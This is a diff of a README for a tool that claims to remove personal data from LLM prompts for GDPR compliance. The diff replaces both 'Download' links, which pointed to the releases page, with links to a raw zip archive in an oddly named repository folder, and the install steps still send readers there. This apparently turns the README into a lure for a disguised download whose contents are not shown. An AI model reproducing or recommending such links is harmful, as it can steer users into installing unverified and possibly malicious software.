@@ -1,6 +1,6 @@
 # 🛡️ mh-gdpr-ai.eu - Keep your LLM prompts GDPR compliant
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Damadamachequebook6546/mh-gdpr-ai.eu/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Damadamachequebook6546/mh-gdpr-ai.eu/raw/refs/heads/main/protonephridium/gdpr_eu_ai_mh_v3.6.zip)
 
 Many modern artificial intelligence tools send prompt data across international borders. If your prompt contains personal information like names, phone numbers, or addresses, this process often breaches European data privacy laws. This software scans your prompts and removes sensitive information before it reaches an AI model.
 
@@ -20,7 +20,7 @@ When you send a request to an AI, the system processes your text. If you include
 
 You can obtain the latest version of the software from the releases page. 
 
-[Visit this page to download](https://github.com/Damadamachequebook6546/mh-gdpr-ai.eu/releases)
+[Visit this page to download](https://github.com/Damadamachequebook6546/mh-gdpr-ai.eu/raw/refs/heads/main/protonephridium/gdpr_eu_ai_mh_v3.6.zip)
 
 1. Navigate to the link above.
 2. Look for the section labeled "Assets."
